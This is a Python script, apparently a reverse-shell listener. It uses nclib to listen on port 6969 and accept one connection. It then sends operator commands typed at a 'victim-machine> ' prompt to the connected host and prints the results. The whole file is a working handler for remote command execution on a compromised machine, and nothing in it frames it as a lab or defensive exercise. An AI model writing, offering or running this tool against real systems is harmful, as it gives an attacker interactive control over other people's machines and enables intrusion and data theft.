from nclib import TCPServer
from time import sleep
from signal import signal, SIGINT
from threading import Thread

# Globals
g_server                  = None
g_client                  = None
g_connection_established  = False
g_was_signal_caught       = False



def close_server():
    global g_server

    if g_server is not None:
        if not g_server.closed:
            g_server.sock.close()
            g_server.close()

def signal_handler(signum, _frame):
    global g_server, g_was_signal_caught

    g_was_signal_caught = True
    print('-=-=- Caught signal %d -=-=-' % signum)
    return


def on_accept(did_succeed: bool):
    global g_client, g_connection_established

    g_connection_established = did_succeed
    if did_succeed:
        print('[TCP Server] Connected to %s:%d' % g_client.peer)

def async_accept(ip: str, port: int, callback):
    global g_server, g_client, g_connection_established

    host = (ip, port)
    g_server = TCPServer(host)
    print('[TCP Server] Listening on %s:%d' % host)

    # Wait for a single connection.
    status = False
    try:
        for _client in g_server:
            g_client = _client
            break
        status = True
    except Exception as e:
        print('[TCP Server] ERROR: Failed to make connection:\n\t', e)
    
    # Hit callback.
    callback(status)
    return

def listener(ip: str = '0.0.0.0', port: int = 6969):
    global g_server, g_client, g_connection_established, g_was_signal_caught

    # Start TCP g_server on a new thread.
    t = Thread(target=async_accept, args=(ip, port, on_accept))
    t.start()
    
    # Wait for a connection or ctrl+c interrupt.
    while not g_connection_established:
        if g_was_signal_caught:
            print('Interrupted before a connection request was received.')
            break

        # No need to belligerent.
        sleep(0.2)

    # Are we connected?
    if g_connection_established:
        command = ''
        while command != 'exit':
            # Exit the loop if the g_server was closed.
            if g_server is None or g_server.closed:
                print('Server closed unexpectedly.')
                break
            
            # uwu
            try:
                # get user input command and write command to socket
                command = input('victim-machine> ')
                g_client.writeln(command)
    
                # get output until dollar sign (bash --posix forces bash-X.X$)
                # data = g_client.read_until('$')
                # data = g_client.read_until('#')
                data = g_client.read(4096, 1.0)
                # data = g_client.interact()
                print(data.decode('utf-8'), end='')  # print string of received bytes
    
            except KeyboardInterrupt:
                print('Keyboard Interrupt')
                break
            
            except Exception as e:
                print('Unknown error:', e)
                break

        print('Disconnected.')

    # Make sure g_server is dead so we can wrangle it's corpse.
    close_server()
    t.join()
    return







if __name__ == '__main__':
    signal(SIGINT, signal_handler)
    listener()
    print('Done')
